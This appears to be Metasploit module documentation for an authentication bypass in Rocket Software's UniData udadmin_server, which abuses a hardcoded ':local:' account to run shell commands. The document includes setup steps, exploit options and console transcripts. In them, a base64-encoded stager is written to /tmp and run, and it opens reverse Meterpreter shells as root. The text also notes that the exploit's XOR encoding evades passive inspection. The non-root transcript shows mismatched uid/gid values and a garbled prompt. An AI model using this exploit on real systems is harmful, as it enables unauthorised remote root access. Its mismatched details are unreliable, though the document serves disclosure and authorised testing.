## Vulnerable Application

Exploits a built-in username/password combination in `udadmin_server`, which is
the administrator server for UniData (and possibly other services). It's
accessed via the RPC service `unirpcd`.

A special username `:local:` is hardcoded into the application. If a user
attempts to remotely authenticate as `:local:`, the password is fully
predictable; it's made up of `<username>:<uid>:<gid>`, where the fields are:

* `username` - a username on the target host (eg, "root")
* `uid` - the corresponding user id (eg, 0 for "root")
* `gid` - any non-zero group id

If the user authenticates to the RPC service with this account, the username
and uid are validated, then the service will drop privileges to the given
account. Then the user can access any of the `udadmin_server` commands,
including `OsCommand`, which executes a Linux shell command.

The vulnerable application is `udadmin_server`, which is an RPC service that's
run as part of `unirpcd`, which powers Rocket Software's UniData application
(among others). The specific software is UniData 8.2.4.3001 for Linux. We
haven't tested any other versions (except for Windows, which is not
vulnerable).

The UniData software can be downloaded for free, but you have to request a demo
copy and wait for an email to arrive. I can provide the installation files if
needed.

The software is distributed as a .zip file, which contains a .tar file:

```
  [ron@unidata unidata]$ unzip Unidata\ Personal\ X86_8.2.4.3001.zip
  Archive:  Unidata Personal X86_8.2.4.3001.zip
    inflating: bin.tar
    inflating: UniData_Hotfix_V824_3001.pdf
    inflating: UniData_Release_Notes_v824.pdf

  [ron@unidata unidata]$ tar -xf bin.tar

  [ron@unidata unidata]$ sudo ./udtsetup

    [default options, set directories]

    CheckLang            Yes
    CheckPerms           No
    Group                sys
    InstallXDEMO         Yes
    LibDir               /home/ron/unidata/unidata/lib
    Startud              Yes
    UdtBin               /home/ron/unidata/unidata/bin
    UdtHome              /home/ron/unidata/unidata
    UnisharedDir         /home/ron/unidata/unishared
    WorkDir              /home/ron/unidata/unidata/work
```

I think it will automatically start the first time you install the software,
but to run it after a reboot (note that this must be done as root):

```
  # export UDTBIN=/home/ron/unidata/unidata/bin
  # export UDTHOME=/home/ron/unidata/unidata
  # export PATH=$PATH:$UDTBIN
  # export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$UDTBIN
  # export LANG=C
  # startud
```

(This module will not work at all against the Windows version)

## Verification Steps

1. Install the application (software and instructions are on Vulnerable Software drive)
1. Start msfconsole
1. Do: `use exploit/linux/misc/unidata_udadmin_auth_bypass`
1. Do: set `RHOST`, `LHOST`, and payload if desired
1. Do: `run`
1. You should get a shell.

## Options

### `UNIRPC_USERNAME`

The local username to use when authenticating. It must correspond to a Linux
account on the target host (it will be passed to `getpwnam(3)`, which must
recognize it). Generally, the default (`root`) works perfectly fine.

### `UNIRPC_UID`

The Linux user id that the service will run your command as. It must be the
user id that corresponds to the `UNIRPC_USERNAME`. The default (`0`) generally
works perfectly fine if `UNIRPC_USERNAME` is `root`.

### `UNIRPC_GID`

The Linux group id that the service will run your command as. Cannot be `0`,
but any other value works fine. The default (`1000`) probably looks the least
weird.

### `UNIRPC_ENDPOINT`

The RPC endpoint to connect to. The default (`udadmin`) as well as `udadmin82`
should work. It's unlikely anything else will work.

### `UNIRPC_ENCODE_MESSAGES`

A boolean, defined in the `unirpc.rb` mixin, that turns UniRPC's packet-body
encoding on or off. Default is `true`.

In the UniRPC header, there is a bit that enables packet encoding. If set, the
packet body is XOR'd with either 1 or 2, depending on another header field.
While it's not strong encoding by any means, it does hide the exploit from
passive inspection. We set the encoding the XOR'ing with 2 by default.

## Scenarios

### Version 8.2.4 with root user

```
  msf6 > use exploit/linux/misc/unidata_udadmin_auth_bypass
  [*] Using configured payload linux/x64/meterpreter/reverse_tcp

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set LHOST 10.0.0.179
  LHOST => 10.0.0.179

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set RHOST 10.0.0.198
  RHOST => 10.0.0.198

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set VERBOSE true
  VERBOSE => true

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > show options

  Module options (exploit/linux/misc/unidata_udadmin_auth_bypass):

     Name             Current Setting  Required  Description
     ----             ---------------  --------  -----------
     RHOSTS           10.0.0.198       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
     RPORT            31438            yes       The target port (TCP)
     SRVHOST          0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
     SRVPORT          8080             yes       The local port to listen on.
     SSL              false            no        Negotiate SSL for incoming connections
     SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
     UNIRPC_GID       1000             yes       gid to authenticate with (must not be 0)
     UNIRPC_UID       0                yes       uid to authenticate with (must match the username)
     UNIRPC_USERNAME  root             yes       Username to authenticate with (must match the uid)
     URIPATH                           no        The URI to use for this exploit (default is random)

  Payload options (linux/x64/meterpreter/reverse_tcp):

     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  10.0.0.179       yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port

  Exploit target:

     Id  Name
     --  ----
     0   Default

  View the full module info with the info, or info -d command.

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > exploit

  [*] Started reverse TCP handler on 10.0.0.179:4444 
  [*] 10.0.0.198:31438 - Running automatic check ("set AutoCheck false" to disable)
  [+] 10.0.0.198:31438 - The target is vulnerable.
  [*] 10.0.0.198:31438 - Connecting to UniRPC endpoint udadmin
  [*] 10.0.0.198:31438 - Authenticating to RPC service as :local: / root:0:1000
  [*] 10.0.0.198:31438 - Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCABFcCgAAs1FIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m>>'/tmp/HPtZI.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/yeIHc' < '/tmp/HPtZI.b64' ; chmod +x '/tmp/yeIHc' ; '/tmp/yeIHc' ; rm -f '/tmp/yeIHc' ; rm -f '/tmp/HPtZI.b64'"]
  [*] 10.0.0.198:31438 - Sending OsCommand request
  [*] Transmitting intermediate stager...(126 bytes)
  [*] Sending stage (3045348 bytes) to 10.0.0.198
  [*] 10.0.0.198:31438 - Command Stager progress - 100.00% done (863/863 bytes)
  [*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.198:40552) at 2023-01-30 14:28:44 -0800

  meterpreter > getuid
  Server username: root
```

### Version 8.2.4 with invalid user

```
  msf6 > use exploit/linux/misc/unidata_udadmin_auth_bypass
  [*] Using configured payload linux/x64/meterpreter/reverse_tcp

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set LHOST 10.0.0.179
  LHOST => 10.0.0.179

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set RHOST 10.0.0.198
  RHOST => 10.0.0.198

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set VERBOSE true
  VERBOSE => true

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set UNIRPC_USERNAME fake
  UNIRPC_USERNAME => fake

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > show options

  Module options (exploit/linux/misc/unidata_udadmin_auth_bypass):

     Name             Current Setting  Required  Description
     ----             ---------------  --------  -----------
     RHOSTS           10.0.0.198       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
     RPORT            31438            yes       The target port (TCP)
     SRVHOST          0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
     SRVPORT          8080             yes       The local port to listen on.
     SSL              false            no        Negotiate SSL for incoming connections
     SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
     UNIRPC_GID       1000             yes       gid to authenticate with (must not be 0)
     UNIRPC_UID       0                yes       uid to authenticate with (must match the username)
     UNIRPC_USERNAME  fake             yes       Username to authenticate with (must match the uid)
     URIPATH                           no        The URI to use for this exploit (default is random)

  Payload options (linux/x64/meterpreter/reverse_tcp):

     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  10.0.0.179       yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port

  Exploit target:

     Id  Name
     --  ----
     0   Default

  View the full module info with the info, or info -d command.

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > exploit

  [*] Started reverse TCP handler on 10.0.0.179:4444 
  [*] 10.0.0.198:31438 - Running automatic check ("set AutoCheck false" to disable)
  [+] 10.0.0.198:31438 - The target is vulnerable.
  [*] 10.0.0.198:31438 - Connecting to UniRPC endpoint udadmin
  [*] 10.0.0.198:31438 - Authenticating to RPC service as :local: / fake:0:1000
  [-] 10.0.0.198:31438 - Exploit failed: UncaughtThrowError uncaught throw "UniRPC server returned an error code: UVE_BAD_LOGINNAME"
  [*] Exploit completed, but no session was created.
```

### Version 8.2.4 with non-root user

```
  msf6 > use exploit/linux/misc/unidata_udadmin_auth_bypass
  [*] Using configured payload linux/x64/meterpreter/reverse_tcp

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set LHOST 10.0.0.179
  LHOST => 10.0.0.179

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set RHOST 10.0.0.198
  RHOST => 10.0.0.198

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set VERBOSE true
  VERBOSE => true

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set UNIRPC_USERNAME postfix
  UNIRPC_USERNAME => postfix
  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > set UNIRPC_UID 89
  UNIRPC_UID => 89
  msf6 exploit(linupostfix/misc/unidata_udadmin_auth_bypass) > show options

  Module options (exploit/linux/misc/unidata_udadmin_auth_bypass):

     Name             Current Setting  Required  Description
     ----             ---------------  --------  -----------
     RHOSTS           10.0.0.198       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
     RPORT            31438            yes       The target port (TCP)
     SRVHOST          0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
     SRVPORT          8080             yes       The local port to listen on.
     SSL              false            no        Negotiate SSL for incoming connections
     SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
     UNIRPC_GID       89               yes       gid to authenticate with (must not be 0)
     UNIRPC_UID       1000             yes       uid to authenticate with (must match the username)
     UNIRPC_USERNAME  postfix          yes       Username to authenticate with (must match the uid)
     URIPATH                           no        The URI to use for this exploit (default is random)


  Payload options (linux/x64/meterpreter/reverse_tcp):

     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  10.0.0.179       yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port


  Exploit target:

     Id  Name
     --  ----
     0   Default



  View the full module info with the info, or info -d command.

  msf6 exploit(linux/misc/unidata_udadmin_auth_bypass) > exploit

  [*] Started reverse TCP handler on 10.0.0.179:4444 
  [*] 10.0.0.198:31438 - Running automatic check ("set AutoCheck false" to disable)
  [+] 10.0.0.198:31438 - The target is vulnerable.
  [*] 10.0.0.198:31438 - Connecting to UniRPC endpoint udadmin
  [*] 10.0.0.198:31438 - Authenticating to RPC service as :local: / postfix:89:1000
  [*] 10.0.0.198:31438 - Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCABFcCgAAs1FIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m>>'/tmp/HEkgx.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/mBurX' < '/tmp/HEkgx.b64' ; chmod +x '/tmp/mBurX' ; '/tmp/mBurX' ; rm -f '/tmp/mBurX' ; rm -f '/tmp/HEkgx.b64'"]
  [*] 10.0.0.198:31438 - Sending OsCommand request
  [*] Transmitting intermediate stager...(126 bytes)
  [*] Sending stage (3045348 bytes) to 10.0.0.198
  [*] 10.0.0.198:31438 - Command Stager progress - 100.00% done (863/863 bytes)
  [*] Meterpreter session 2 opened (10.0.0.179:4444 -> 10.0.0.198:40554) at 2023-01-30 14:31:14 -0800

  meterpreter > getuid
  Server username: postfix
```
